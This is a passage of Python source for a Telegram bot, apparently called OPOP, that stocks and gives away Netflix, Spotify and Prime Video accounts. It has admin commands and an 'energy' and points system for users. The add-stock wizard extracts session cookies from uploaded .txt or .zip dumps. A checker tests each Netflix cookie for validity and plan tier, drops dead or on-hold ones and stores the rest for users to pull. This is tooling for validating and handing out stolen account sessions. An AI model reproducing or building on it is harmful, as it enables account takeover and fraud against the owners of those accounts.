                out.append(f"┣ 💎 Pts: {u.get('points', 0.0)} | 📈 Pulls: {u.get('total_pulls', 0)} | 👥 Refs: {u.get('refs', 0)}")
                out.append(f"┗ 🔴 Banned: {'Yes 🔴' if u.get('is_banned') else 'No 🟢'}")
                out.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
            report_str = "\n".join(out)
            try: bot.send_document(ADMIN_ID, ("OPOP_Users_PRO_Report.txt", BytesIO(report_str.encode('utf-8'))), caption="📊 <b>إليك التقرير المفصل للمستخدمين (بصيغة PRO)</b>\n<blockquote>💡 تم دمج الرموز والتصميم الاحترافي.</blockquote>", parse_mode="HTML", timeout=60)
            except Exception as e: bot.reply_to(message, f"❌ خطأ: {e}")

        elif cmd == '/top':
            top_pulls = sorted(users.items(), key=lambda x: x[1].get('total_pulls', 0), reverse=True)[:10]
            txt = "🏆 <b>TOP 10 USERS (PULLS)</b>\n━━━━━━━━━━━━━━━━━━\n"
            for i, (u_id, u) in enumerate(top_pulls, 1):
                clean_name = str(u.get('name', 'Unknown')).replace('<', '').replace('>', '')
                txt += f"<b>{i}.</b> {clean_name} - <b>{u.get('total_pulls', 0)}</b> Pulls\n"
            bot.reply_to(message, txt, parse_mode="HTML")

        elif cmd == '/stats':
            st = init_stock()
            total_nf = sum(len(lst) for lst in st.get("Netflix",{}).values())
            bot.reply_to(message, f"📊 <b>SYSTEM OVERVIEW (RAS LKHYT)</b>\n━━━━━━━━━━━━━━━━━━\n🎬 <b>Netflix Total:</b> {total_nf}\n🎵 <b>Spotify Total:</b> {len(st.get('Spotify',{}).get('Premium',[]))}\n🍿 <b>Prime Total:</b> {len(st.get('PrimeVideo',{}).get('Premium',[]))}\n\n<blockquote>💡 لمعرفة التفاصيل (Premium, Standard, Basic) أرسل /checkstock</blockquote>", parse_mode="HTML")

        elif cmd == '/checkstock':
            st = init_stock()
            nP, nS, nB = len(st['Netflix']['Premium']), len(st['Netflix']['Standard']), len(st['Netflix']['Basic'])
            pP = len(st.get('PrimeVideo', {}).get('Premium', []))
            sP = len(st.get('Spotify', {}).get('Premium', []))
            txt = f"📦 <b>DEEP STOCK ANALYSIS</b>\n━━━━━━━━━━━━━━━━━━\n🎬 <b>NETFLIX:</b>\n┣ 👑 Premium: {nP}\n┣ ⭐ Standard: {nS}\n┗ 🎯 Basic: {nB}\n\n🍿 <b>PRIME VIDEO:</b>\n┗ 👑 Premium: {pP}\n\n🎵 <b>SPOTIFY:</b>\n┗ 👑 Premium: {sP}\n━━━━━━━━━━━━━━━━━━"
            bot.reply_to(message, txt, parse_mode="HTML")

        elif cmd == '/info':
            if not args: return bot.reply_to(message, "⚠️ الاستخدام: `/info [User_ID]` أو `/info [@username]`")
            target = args[0].replace("@", "")
            uid = target if target in users else next((k for k, v in users.items() if v.get("username", "").lower() == target.lower()), None)
            if uid and uid in users:
                u = process_drip(users[uid])
                uname_txt = f"@{u['username']}" if u.get("username") else "No Username"
                clean_name = str(u.get('name', 'Unknown')).replace('<', '').replace('>', '')
                txt = (
                    f"📇 <b>PRO DEEP USER INFO:</b>\n━━━━━━━━━━━━━━━━━━\n"
                    f"🆔 <b>ID:</b> <code>{uid}</code>\n"
                    f"📇 <b>Name:</b> {clean_name}\n"
                    f"🔗 <b>Username:</b> {uname_txt}\n"
                    f"👑 <b>Tier:</b> <b>{u.get('tier')}</b>\n"
                    f"🔋 <b>Energy:</b> {u.get('energy'):.1f}/{TIERS.get(u.get('tier','Free'))['cap']} ⚡\n"
                    f"📦 <b>Reserve Tank:</b> +{u.get('reserve'):.1f} ⚡\n"
                    f"💎 <b>Points:</b> {u.get('points')} Pts\n"
                    f"📈 <b>Total Pulls:</b> {u.get('total_pulls', 0)} Accounts\n"
                    f"👥 <b>Invites (Refs):</b> {u.get('refs')} Users\n"
                    f"🔴 <b>Banned:</b> {'Yes 🔴' if u.get('is_banned') else 'No 🟢'}\n"
                    f"━━━━━━━━━━━━━━━━━━"
                )
                bot.reply_to(message, txt, parse_mode="HTML")
            else: bot.reply_to(message, "❌ <b>المستخدم غير موجود.</b>", parse_mode="HTML")

        elif cmd == '/find':
            if not args: return bot.reply_to(message, "⚠️ الاستخدام: `/find [Username | Name]`")
            query = " ".join(args).lower().replace("@", "")
            found = [(u_id, u) for u_id, u in users.items() if query in str(u_id) or query in str(u.get('name', '')).lower() or query in str(u.get('username', '')).lower()]
            if found:
                res = f"🔎 <b>Search Results:</b>\n━━━━━━━━━━━━━━━━━━\n"
                for u_id, u in found[:15]: 
                    clean_name = str(u.get('name', 'Unknown')).replace('<', '').replace('>', '')
                    res += f"🆔 <code>{u_id}</code> | 📇 {clean_name[:10]} | 🔗 @{u.get('username','None')} | 👑 {u.get('tier')}\n"
                bot.reply_to(message, res, parse_mode="HTML")
            else: bot.reply_to(message, "❌ <b>لم يتم العثور على أي مستخدم.</b>", parse_mode="HTML")

        elif cmd == '/tier':
            if len(args) < 2 or args[1].upper() not in ["FREE", "PRO", "VIP", "SUPER"]: return bot.reply_to(message, "⚠️ Usage: `/tier [ID] [FREE/PRO/VIP/SUPER]`")
            uid = args[0]
            if uid in users:
                with DB_LOCK:
                    users[uid]["tier"] = args[1].upper()
                    users[uid]["energy"] = TIERS.get(args[1].upper())["cap"]
                    save_db(USERS_FILE, users)
                bot.reply_to(message, f"✅ <b>تم تحديث الرتبة بنجاح!</b>\n📇 <b>المستخدم:</b> <code>{uid}</code>\n👑 <b>الرتبة الجديدة:</b> {args[1].upper()}", parse_mode="HTML")
            else: bot.reply_to(message, "❌ <b>المستخدم غير موجود.</b>", parse_mode="HTML")

        elif cmd == '/setenergy':
            if len(args) < 2: return bot.reply_to(message, "⚠️ Usage: `/setenergy [ID] [Amount]`")
            uid, amt = args[0], float(args[1])
            if uid in users:
                with DB_LOCK:
                    users[uid]["energy"] = amt
                    save_db(USERS_FILE, users)
                bot.reply_to(message, f"✅ <b>تم تعيين الطاقة الأساسية لـ <code>{uid}</code> لتصبح {amt}⚡</b>", parse_mode="HTML")
            else: bot.reply_to(message, "❌ <b>المستخدم غير موجود.</b>", parse_mode="HTML")

        elif cmd == '/addenergy': 
            if len(args) < 2: return bot.reply_to(message, "⚠️ Usage: `/addenergy [ID] [Amount]`")
            uid, amt = args[0], float(args[1])
            with DB_LOCK:
                if uid not in users: users[uid] = {"energy": 100.0, "reserve": 0.0, "is_banned": False, "tier": "Free"}
                cap = TIERS.get(users[uid].get("tier", "Free"), TIERS["Free"])["cap"]
                space = cap - users[uid].get("energy", 0.0)
                if space > 0:
                    fill = min(space, amt)
                    users[uid]["energy"] += fill
                    users[uid]["reserve"] += (amt - fill)
                else: users[uid]["reserve"] += amt
                save_db(USERS_FILE, users)
            bot.reply_to(message, f"⚡ <b>𝗦𝗬𝗦𝗧𝗘𝗠 𝗨𝗣𝗗𝗔𝗧𝗘</b> ⚡\n━━━━━━━━━━━━━━━━━━\n📇 <b>Target ID:</b> <tg-spoiler>{uid}</tg-spoiler>\n📈 <b>Energy Added:</b> <b>+{amt}⚡</b>\n✅ <i>تمت العملية بنجاح.</i>", parse_mode="HTML")

        elif cmd == '/addpoints':
            if len(args) < 2: return bot.reply_to(message, "⚠️ Usage: `/addpoints [ID] [Amount]`")
            uid, amt = args[0], float(args[1])
            if uid in users:
                with DB_LOCK:
                    users[uid]["points"] += amt; save_db(USERS_FILE, users)
                bot.reply_to(message, f"✅ <b>Added {amt} points to <code>{uid}</code>.</b>", parse_mode="HTML")
            else: bot.reply_to(message, "❌ <b>المستخدم غير موجود.</b>", parse_mode="HTML")

        elif cmd == '/reset':
            if not args: return bot.reply_to(message, "⚠️ الاستخدام: `/reset [User_ID]`")
            uid = args[0]
            if uid in users:
                with DB_LOCK: users[uid]["energy"] = TIERS.get(users[uid].get('tier', 'Free'))['cap']; save_db(USERS_FILE, users)
                bot.reply_to(message, f"✅ <b>تم شحن طاقة المستخدم <code>{uid}</code> بالكامل للحد الأقصى.</b>", parse_mode="HTML")
            else: bot.reply_to(message, "❌ <b>المستخدم غير موجود.</b>", parse_mode="HTML")

        elif cmd == '/ban':
            if not args: return bot.reply_to(message, "⚠️ الاستخدام: `/ban [User_ID]`")
            if args[0] in users:
                with DB_LOCK: users[args[0]]["is_banned"] = True; save_db(USERS_FILE, users)
                bot.reply_to(message, f"🔴 <b>تم حظر المستخدم <code>{args[0]}</code> نهائياً.</b>", parse_mode="HTML")
            else: bot.reply_to(message, "❌ <b>المستخدم غير موجود.</b>", parse_mode="HTML")
            
        elif cmd == '/unban':
            if not args: return bot.reply_to(message, "⚠️ الاستخدام: `/unban [User_ID]`")
            if args[0] in users:
                with DB_LOCK: users[args[0]]["is_banned"] = False; save_db(USERS_FILE, users)
                bot.reply_to(message, f"✅ <b>تم فك الحظر عن المستخدم <code>{args[0]}</code> بنجاح.</b>", parse_mode="HTML")
            else: bot.reply_to(message, "❌ <b>المستخدم غير موجود.</b>", parse_mode="HTML")

        elif cmd == '/getstock':
            if len(args) < 2: return bot.reply_to(message, "⚠️ Usage: `/getstock [Service] [Tier]` (e.g., `/getstock Netflix Premium`)")
            srv, tier = args[0], args[1]
            st = init_stock()
            accs = st.get(srv, {}).get(tier, [])
            if not accs: return bot.reply_to(message, f"❌ <b>No stock found for {srv} {tier}</b>", parse_mode="HTML")
            
            lines = [acc.get("raw_clean", "") for acc in accs]
            out_txt = "\n\n".join(lines)
            try: bot.send_document(ADMIN_ID, (f"OPOP_{srv}_{tier}_Stock.txt", BytesIO(out_txt.encode('utf-8'))), caption=f"📥 <b>تم سحب {len(accs)} حساب من {srv} {tier} بنجاح.</b>", parse_mode="HTML", timeout=60)
            except Exception as e: bot.reply_to(message, f"❌ خطأ: {e}")

        elif cmd == '/clearstock':
            with DB_LOCK: save_db(STOCK_FILE, {"Netflix": {"Premium": [], "Standard": [], "Basic": [], "Unknown": []}, "Spotify": {"Premium": []}, "PrimeVideo": {"Premium": []}})
            bot.reply_to(message, "🗑️ <b>تم مسح جميع الحسابات من المخزون بنجاح! المخزون الآن فارغ.</b>", parse_mode="HTML")

        elif cmd == '/purgedead':
            if len(args) < 1: return bot.reply_to(message, "⚠️ Usage: `/purgedead [Service]` (e.g. `/purgedead Netflix`)")
            srv = args[0]
            stock = init_stock()
            if srv not in stock: return bot.reply_to(message, f"❌ Service {srv} not found in stock.")
            total_accs = sum(len(lst) for lst in stock[srv].values())
            if total_accs == 0: return bot.reply_to(message, "📦 Stock is already empty.")

            msg_status = bot.reply_to(message, f"🧹 <b>OPOP PURGE INITIATED</b>\n━━━━━━━━━━━━━━━━━━\nScanning {total_accs} {srv} accounts in stock...\n<i>Please wait, this might take a while...</i>", parse_mode="HTML")
            
            dead_count = 0
            alive_count = 0
            
            def check_and_clean(acc, tier_name):
                nonlocal dead_count, alive_count
                if srv == "Netflix":
                    c_dict = {}
                    for part in re.split(r"[;\n]", acc.get("raw_clean", "")):
                        if "=" in part:
                            k, _, v = part.partition("=")
                            c_dict[k.strip()] = v.strip()
                    res = check_netflix_account(c_dict)
                    if res and res.get("hold") != "Yes" and res.get("tier") != "Unknown":
                        alive_count += 1
                        return (tier_name, acc) 
                    else:
                        dead_count += 1
                        return None
                return (tier_name, acc) 

            all_tasks = []
            for tier, acc_list in stock[srv].items():
                for acc in acc_list: all_tasks.append((acc, tier))
                    
            new_stock_srv = {k: [] for k in stock[srv].keys()}
            
            with ThreadPoolExecutor(max_workers=5) as executor: 
                futures = [executor.submit(check_and_clean, task[0], task[1]) for task in all_tasks]
                for future in futures:
                    res = future.result()
                    if res: new_stock_srv[res[0]].append(res[1])
            
            with DB_LOCK:
                st = init_stock()
                st[srv] = new_stock_srv
                save_db(STOCK_FILE, st)
                
            bot.edit_message_text(f"🧹 <b>PURGE COMPLETE</b>\n━━━━━━━━━━━━━━━━━━\n✅ Alive Kept: <b>{alive_count}</b>\n💀 Dead Removed: <b>{dead_count}</b>\n━━━━━━━━━━━━━━━━━━\n<i>Stock is now 100% clean!</i>", message.chat.id, msg_status.message_id, parse_mode="HTML")

        elif cmd == '/drop':
            if len(args) < 2: return bot.reply_to(message, "⚠️ الاستخدام: `/drop [Service] [Amount]`")
            bot.send_message(CHANNEL_USER, f"🚨 <b>𝗠𝗔𝗦𝗦𝗜𝗩𝗘 𝗦𝗧𝗢𝗖𝗞 𝗗𝗥𝗢𝗣!</b> 🚨\n━━━━━━━━━━━━━━━━━━\n🔥 <b>Added:</b> {args[1]} accounts of <b>{args[0].capitalize()}</b> to stock!\n🎁 <b>Action:</b> Take your account now!\n━━━━━━━━━━━━━━━━━━\n📌 <b>Bot:</b> @{BOT_USERNAME}\n⚡ <i>Powered by OPop 👑</i>", parse_mode="HTML")
            bot.reply_to(message, "✅ <b>تم نشر إعلان السقوط (Drop) في القناة بنجاح!</b>", parse_mode="HTML")

        elif cmd == '/send':
            if len(args) < 2: return bot.reply_to(message, "⚠️ الاستخدام: `/send [User_ID] [Message]`")
            target_uid, msg_text = args[0], message.text.split(args[0], 1)[1].strip()
            if target_uid not in users: return bot.reply_to(message, "❌ <b>هذا المستخدم غير موجود.</b>", parse_mode="HTML")
            bot.send_message(target_uid, f"📢 <b>رسالة من الإدارة / Admin:</b>\n━━━━━━━━━━━━━━━━━━\n{msg_text}\n━━━━━━━━━━━━━━━━━━\n⚡ <i>Powered by OPop 👑</i>", parse_mode="HTML")
            bot.reply_to(message, "✅ <b>تم إرسال الرسالة للمستخدم بنجاح!</b>", parse_mode="HTML")

        elif cmd == '/broadcast':
            text = message.text.replace("/broadcast", "").strip()
            if not text: return bot.reply_to(message, "⚠️ الاستخدام: `/broadcast [message]`\n<i>(استعمل '|' في النهاية لإضافة زر، مثلا: رسالة | اسم الزر | الرابط)</i>", parse_mode="HTML")
            
            button_markup = None
            if "|" in text:
                parts = text.split("|")
                text = parts[0].strip()
                if len(parts) >= 3:
                    btn_text = parts[1].strip()
                    btn_url = parts[2].strip()
                    button_markup = InlineKeyboardMarkup().add(InlineKeyboardButton(btn_text, url=btn_url))

            sent, msg_wait = 0, bot.reply_to(message, "⏳ <i>جاري إرسال الإعلان... (يتم الإرسال ببطء لتجنب حظر السيرفور من تيليغرام)</i>", parse_mode="HTML")
            for uid in users:
                try: 
                    bot.send_message(uid, f"📢 <b>الإعلان الرسمي / Broadcast:</b>\n━━━━━━━━━━━━━━━━━━\n{text}\n━━━━━━━━━━━━━━━━━━\n⚡ <i>Powered by OPop 👑</i>", parse_mode="HTML", reply_markup=button_markup)
                    sent += 1
                    time.sleep(0.05) 
                except: pass
            bot.edit_message_text(f"✅ <b>تم الإرسال بنجاح إلى {sent} مستخدم!</b>", message.chat.id, msg_wait.message_id, parse_mode="HTML")

        elif cmd == '/happyhour':
            global HAPPY_HOUR
            if not args: return bot.reply_to(message, "⚠️ الاستخدام: `/happyhour [Minutes]`")
            mins = int(args[0])
            HAPPY_HOUR["active"] = True
            HAPPY_HOUR["end_time"] = time.time() + (mins * 60)
            hh_msg = (f"⏳ <b>𝗙𝗟𝗔𝗦𝗛 𝗦𝗔𝗟𝗘 / 𝗛𝗔𝗣𝗣𝗬 𝗛𝗢𝗨𝗥 𝗔𝗖𝗧𝗜𝗩𝗘!</b> ⏳\n━━━━━━━━━━━━━━━━━━\n🎉 All Pulls & Dice are heavily discounted for the next <b>{mins} minutes</b>!\n\n🚀 Go pull your premium accounts now!")
            bot.send_message(CHANNEL_USER, hh_msg, parse_mode="HTML")
            bot.reply_to(message, f"✅ <b>تم تفعيل ساعة الحسم (تخفيض الأسعار) لمدة {mins} دقيقة بنجاح!</b>", parse_mode="HTML")

        elif cmd == '/genkey':
            if len(args) < 1 or args[0].upper() not in ["PRO", "VIP", "SUPER"]: return bot.reply_to(message, "⚠️ الاستخدام: `/genkey [PRO|VIP|SUPER]`")
            code = f"OPOP-{args[0].upper()}-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=6))
            with DB_LOCK: db = load_db(KEYS_FILE, {}); db[code] = {"tier": args[0].upper(), "used": False}; save_db(KEYS_FILE, db)
            bot.reply_to(message, f"🔑 <b>تم إنشاء المفتاح بنجاح:</b>\n<code>{code}</code>", parse_mode="HTML")

        elif cmd == '/delkey':
            if len(args) < 1: return bot.reply_to(message, "⚠️ الاستخدام: `/delkey [CODE]`")
            code = args[0].upper()
            with DB_LOCK:
                db = load_db(KEYS_FILE, {})
                if code in db: del db[code]; save_db(KEYS_FILE, db); bot.reply_to(message, f"✅ <b>تم حذف المفتاح <code>{code}</code> من النظام.</b>", parse_mode="HTML")
                else: bot.reply_to(message, "❌ <b>هذا المفتاح غير موجود.</b>", parse_mode="HTML")
            
        elif cmd == '/genpromo':
            if len(args) < 3 or args[0].upper() not in ["ENERGY", "BONUS"]: return bot.reply_to(message, "⚠️ الاستخدام: `/genpromo [ENERGY|BONUS] [Value] [MaxUses]`")
            code = "PROMO-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=5))
            with DB_LOCK: db = load_db(PROMO_FILE, {}); db[code] = {"type": args[0].upper(), "val": float(args[1]), "max": int(args[2]), "used_by": []}; save_db(PROMO_FILE, db)
            bot.reply_to(message, f"✅ <b>تم إنشاء الرمز الترويجي بنجاح!</b>\n\n<code>{code}</code>", parse_mode="HTML")
            
    except Exception as e: bot.reply_to(message, f"❌ <b>حدث خطأ أثناء تنفيذ الأمر:</b> {e}", parse_mode="HTML")

# ==========================================
# 🎁 PRO FEATURE: GIFT SYSTEM (USER TO USER - ADMIN UNLIMITED)
# ==========================================
@bot.message_handler(commands=['gift'])
def gift_energy(message):
    uid = str(message.chat.id)
    if is_banned(uid): return
    args = message.text.split()
    
    temp_users = load_db(USERS_FILE, {})
    lang = temp_users.get(uid, {}).get("lang", "en")
    
    if len(args) < 3: 
        return bot.reply_to(message, "<blockquote>⚠️ Usage: `/gift [User_ID] [Amount]`</blockquote>" if lang=="en" else "<blockquote>⚠️ الاستخدام: `/gift [User_ID] [Amount]`</blockquote>", parse_mode="HTML")
    
    target_id = args[1]
    try: amt = float(args[2])
    except ValueError: return bot.reply_to(message, "❌ Invalid amount." if lang=="en" else "❌ القيمة غير صالحة.")
    
    if amt <= 0: return bot.reply_to(message, "❌ Amount must be greater than 0." if lang=="en" else "❌ القيمة يجب أن تكون أكبر من 0.")
    
    with DB_LOCK:
        users = load_db(USERS_FILE, {})
        u = process_drip(users.get(uid, {}))
        is_admin = u.get("is_admin", False)
        
        if target_id not in users:
            return bot.reply_to(message, "❌ Target user not found in database." if lang=="en" else "❌ المستخدم غير موجود في قاعدة البيانات.")
        if target_id == uid:
            return bot.reply_to(message, "❌ You cannot gift yourself!" if lang=="en" else "❌ لا يمكنك إرسال هدية لنفسك!")
        
        if not is_admin and u.get("energy", 0) < amt:
            return bot.reply_to(message, "🔴 Not enough energy to send this gift." if lang=="en" else "🔴 طاقة غير كافية لإرسال هذه الهدية.")
        
        if not is_admin:
            users[uid]["energy"] -= amt
            
        cap = TIERS.get(users[target_id].get("tier", "Free"), TIERS["Free"])["cap"]
        space = cap - users[target_id].get("energy", 0.0)
        if space > 0:
            fill = min(space, amt)
            users[target_id]["energy"] += fill
            users[target_id]["reserve"] += (amt - fill)
        else: users[target_id]["reserve"] += amt
        save_db(USERS_FILE, users)
        
    bot.reply_to(message, f"✅ <b>Successfully gifted {amt}⚡ to user <code>{target_id}</code>!</b>" if lang=="en" else f"✅ <b>تم إرسال {amt}⚡ بنجاح إلى المستخدم <code>{target_id}</code>!</b>", parse_mode="HTML")
    
    try:
        t_lang = users[target_id].get("lang", "en")
        bot.send_message(target_id, f"🎁 <b>GIFT RECEIVED!</b>\n━━━━━━━━━━━━━━━━━━\nYou received <b>{amt}⚡</b> from your friend <code>{uid}</code>." if t_lang=="en" else f"🎁 <b>هدية جديدة!</b>\n━━━━━━━━━━━━━━━━━━\nلقد تلقيت <b>{amt}⚡</b> من صديقك <code>{uid}</code>.", parse_mode="HTML")
    except: pass

# ==========================================
# 🛡️ 1. SMART STOCK WIZARD (Admin /ADD)
# ==========================================
@bot.message_handler(commands=['add'])
def admin_add_stock(message):
    bot.clear_step_handler_by_chat_id(message.chat.id)
    if message.chat.id != ADMIN_ID: return
    lang = load_db(USERS_FILE, {}).get(str(message.chat.id), {}).get("lang", "en")
    m = InlineKeyboardMarkup()
    if lang == "en":
        m.row(InlineKeyboardButton("🎬 Netflix", callback_data="add_srv_Netflix"), InlineKeyboardButton("🎵 Spotify", callback_data="add_srv_Spotify"))
        m.add(InlineKeyboardButton("🍿 Prime Video", callback_data="add_srv_PrimeVideo"))
        m.add(InlineKeyboardButton("❌ Cancel", callback_data="main_menu"))
        bot.reply_to(message, "📦 <b>Select Service to Add Stock:</b>\n<blockquote>💡 Tip: Engine auto-detects formats & tiers. Output from Advanced Checker is fully supported.</blockquote>", reply_markup=m, parse_mode="HTML")
    else:
        m.row(InlineKeyboardButton("🎬 نتفليكس", callback_data="add_srv_Netflix"), InlineKeyboardButton("🎵 سبوتيفاي", callback_data="add_srv_Spotify"))
        m.add(InlineKeyboardButton("🍿 برايم فيديو", callback_data="add_srv_PrimeVideo"))
        m.add(InlineKeyboardButton("❌ إلغاء", callback_data="main_menu"))
        bot.reply_to(message, "📦 <b>اختر الخدمة لإضافة المخزون:</b>\n<blockquote>💡 معلومة: المحرك يقوم باستخراج الكوكيز من أي صيغة (بما فيها الملفات من الفاحص المتقدم).</blockquote>", reply_markup=m, parse_mode="HTML")

@bot.callback_query_handler(func=lambda c: c.data.startswith("add_srv_"))
def admin_add_stock_service(c):
    if c.message.chat.id != ADMIN_ID: return
    try: bot.answer_callback_query(c.id)
    except Exception: pass
    srv = c.data.split("_")[2]
    lang = load_db(USERS_FILE, {}).get(str(c.message.chat.id), {}).get("lang", "en")
    msg = bot.edit_message_text(f"📦 <b>Service: {srv}</b>\n━━━━━━━━━━━━━━━━━━\n⚡ <i>Please upload your .txt or .zip file now...</i> 📤", c.message.chat.id, c.message.message_id, parse_mode="HTML") if lang == "en" else bot.edit_message_text(f"📦 <b>الخدمة: {srv}</b>\n━━━━━━━━━━━━━━━━━━\n⚡ <i>يرجى رفع ملفك (.txt أو .zip) الآن...</i> 📤", c.message.chat.id, c.message.message_id, parse_mode="HTML")
    bot.register_next_step_handler(msg, process_smart_add_file, srv, lang)

def process_smart_add_file(message, srv, lang):
    chat_id = message.chat.id
    if message.text and message.text.startswith('/'):
        bot.clear_step_handler_by_chat_id(chat_id)
        bot.send_message(chat_id, "❌ <b>Operation cancelled.</b> Received a new command." if lang == "en" else "❌ <b>تم إلغاء العملية.</b> بسبب إرسال أمر جديد.", parse_mode="HTML")
        return

    if not message.content_type in ['text', 'document']:
        return bot.send_message(chat_id, "❌ <b>Invalid format.</b>" if lang=="en" else "❌ <b>صيغة الملف غير صالحة.</b>", parse_mode="HTML")
    
    msg_wait = bot.reply_to(message, "🚀 <i>[■□□□□□] Initializing OPOP Engine...</i>", parse_mode="HTML")
    
    try:
        content = ""
        filename = "text_input.txt"
        
        if message.content_type == 'text':
            content = message.text
        else:
            filename = message.document.file_name
            down = bot.download_file(bot.get_file(message.document.file_id).file_path)
            
            if message.document.file_name.endswith('.zip'):
                with zipfile.ZipFile(BytesIO(down)) as z:
                    for fn in z.namelist():
                        if fn.endswith('.txt'): 
                            content += z.read(fn).decode('utf-8', errors='ignore') + "\n"
            else:
                content = down.decode('utf-8', errors='ignore')
                
        effect_msgs = ["<i>📡 OPOP SYSTEM: Intercepting data stream... [■■□□□□]</i>", f"<i>🗃️ OPOP SYSTEM: Scanning <b>{filename}</b>... [■■■■□□]</i>", f"<i>🔍 OPOP SYSTEM: Extracting Cookies... [■■■■■□]</i>"]
        for eff in effect_msgs:
            try: bot.edit_message_text(eff, chat_id, msg_wait.message_id, parse_mode="HTML"); time.sleep(0.4)
            except Exception: pass

        valid_formats = extract_netflix_tokens(content) if srv == "Netflix" else [{"raw_clean": line.strip()} for line in content.splitlines() if line.strip()]
        total = len(valid_formats)
        
        try: bot.edit_message_text(f"<i>✅ OPOP Engine loaded <b>{total}</b> cookies! [■■■■■■]</i>\n<i>🚀 Starting V-GOD Verification...</i>", chat_id, msg_wait.message_id, parse_mode="HTML"); time.sleep(0.6)
        except Exception: pass

        if total == 0: return bot.edit_message_text("❌ <b>No valid accounts found.</b>" if lang=="en" else "❌ <b>لم يتم العثور على حسابات صالحة.</b>", chat_id, msg_wait.message_id, parse_mode="HTML")

        if srv == "Netflix":
            global ADD_SESSIONS
            ADD_SESSIONS[chat_id] = {
                "valid_formats": valid_formats,
                "srv": srv,
                "lang": lang,
                "msg_id": msg_wait.message_id,
                "total": total
            }
            
            m = InlineKeyboardMarkup()
            if lang == "en":
                m.row(InlineKeyboardButton("✅ Yes (Filter Update Payment)", callback_data="add_filter_yes"), 
                      InlineKeyboardButton("❌ No (Add All Accounts)", callback_data="add_filter_no"))
            else:
                m.row(InlineKeyboardButton("✅ نعم (تصفية Update Payment)", callback_data="add_filter_yes"), 
                      InlineKeyboardButton("❌ لا (إضافة الكل للمخزون)", callback_data="add_filter_no"))
            
            txt_ask = "🛡️ <b>Step 2: Filter Accounts?</b>\n<blockquote>💡 Choose <b>YES</b> to automatically reject accounts with 'Update Payment' (On Hold) or unknown plans.</blockquote>" if lang == "en" else "🛡️ <b>الخطوة 2: هل تريد تصفية الحسابات؟</b>\n<blockquote>💡 اختر <b>نعم</b> لرفض الحسابات الميتة أو التي تطلب الدفع تلقائياً.</blockquote>"
            
            bot.edit_message_text(txt_ask, chat_id, msg_wait.message_id, reply_markup=m, parse_mode="HTML")
            return 
        else:
            threading.Thread(target=execute_smart_add, args=(chat_id, valid_formats, srv, lang, msg_wait.message_id, total, False)).start()

    except Exception as e:
        bot.edit_message_text(f"<blockquote>❌ Error: {e}</blockquote>", chat_id, msg_wait.message_id, parse_mode="HTML")

@bot.callback_query_handler(func=lambda c: c.data.startswith("add_filter_"))
def handle_add_filter_choice(c):
    chat_id = c.message.chat.id
    if c.message.chat.id != ADMIN_ID: return
    try: bot.answer_callback_query(c.id)
    except: pass
    
    global ADD_SESSIONS
    session = ADD_SESSIONS.get(chat_id)
    if not session:
        return bot.edit_message_text("❌ Session expired. Please send the file again.", chat_id, c.message.message_id)
        
    do_filter = (c.data == "add_filter_yes")
    bot.edit_message_text("🚀 <b>جاري إضافة الحسابات للمخزون...</b>" if session["lang"]=="ar" else "🚀 <b>Adding accounts to stock...</b>", chat_id, c.message.message_id, parse_mode="HTML")
    
    threading.Thread(target=execute_smart_add, args=(chat_id, session["valid_formats"], session["srv"], session["lang"], session["msg_id"], session["total"], do_filter)).start()

def execute_smart_add(chat_id, valid_formats, srv, lang, msg_id, total, do_filter):
    stats = {"checked": 0, "Premium": 0, "Standard": 0, "Basic": 0, "Unknown": 0, "failed": 0}
    
    def update_progress():
        bar = get_progress_bar(stats["checked"], total, style="blocks") 
        pct = int((stats["checked"] / total) * 100)
        if srv == "Netflix":
            txt = f"🚀 <b>OPOP Engine Active...</b>\n⏳ <i>[{bar}] {pct}%</i>\n\n🔎 <b>Processing:</b> {stats['checked']}/{total}\n👑 Prem: <b>{stats['Premium']}</b> | ⭐ Std: <b>{stats['Standard']}</b> | 🎯 Bas: <b>{stats['Basic']}</b>\n❓ Unk: <b>{stats['Unknown']}</b>\n❌ Failed/Filtered: <b>{stats['failed']}</b>\n\n<blockquote>💡 Filter Mode: {'ON 🟢 (Rejecting Dead Accounts)' if do_filter else 'OFF 🔴 (Adding All)'}</blockquote>" if lang == "en" else f"🚀 <b>المحرك الذكي قيد العمل...</b>\n⏳ <i>[{bar}] {pct}%</i>\n\n🔎 <b>جاري الفحص:</b> {stats['checked']}/{total}\n👑 Prem: <b>{stats['Premium']}</b> | ⭐ Std: <b>{stats['Standard']}</b> | 🎯 Bas: <b>{stats['Basic']}</b>\n❓ Unk: <b>{stats['Unknown']}</b>\n❌ Failed/Filtered: <b>{stats['failed']}</b>\n\n<blockquote>💡 وضع التصفية: {'مفعل 🟢 (يرفض الحسابات الميتة)' if do_filter else 'معطل 🔴 (إضافة الكل)'}</blockquote>"
        else:
            txt = f"🚀 <b>OPOP Engine Active...</b>\n⏳ <i>[{bar}] {pct}%</i>\n\n🔎 <b>Processing {srv}:</b> {stats['checked']}/{total} (Generic)\n✅ Added: <b>{stats['Premium']}</b>"
        try: bot.edit_message_text(txt, chat_id, msg_id, parse_mode="HTML")
        except Exception: pass

    last_update = time.time()
    
    with ThreadPoolExecutor(max_workers=5) as executor:
        if srv == "Netflix":
            for acc in executor.map(check_netflix_account, valid_formats):
                stats["checked"] += 1
                if acc:
                    tier = acc.get("tier", "Unknown")
                    
                    if do_filter:
                        if acc.get("hold") == "Yes" or tier == "Unknown":
                            stats["failed"] += 1
                            continue 
                            
                    if tier in stats: stats[tier] += 1
                    with DB_LOCK:
                        stock = init_stock()
                        if srv not in stock: stock[srv] = {}
                        if tier not in stock[srv]: stock[srv][tier] = []
                        stock[srv][tier].append(acc)
                        save_db(STOCK_FILE, stock)
                else: stats["failed"] += 1
                
                if time.time() - last_update > 1.5:
                    update_progress(); last_update = time.time()
        else:
            for line in valid_formats:
                stats["checked"] += 1
                acc = {"raw_clean": line.get("raw_clean", ""), "email": "Custom Account"}
                stats["Premium"] += 1 
                with DB_LOCK:
                    stock = init_stock()
                    if srv not in stock: stock[srv] = {}
                    if "Premium" not in stock[srv]: stock[srv]["Premium"] = []
                    stock[srv]["Premium"].append(acc)
                    save_db(STOCK_FILE, stock)
                
                if time.time() - last_update > 1.5:
                    update_progress(); last_update = time.time()
                    
    total_added = 0
    if srv == "Netflix":
        total_added = stats['Premium'] + stats['Standard'] + stats['Basic']
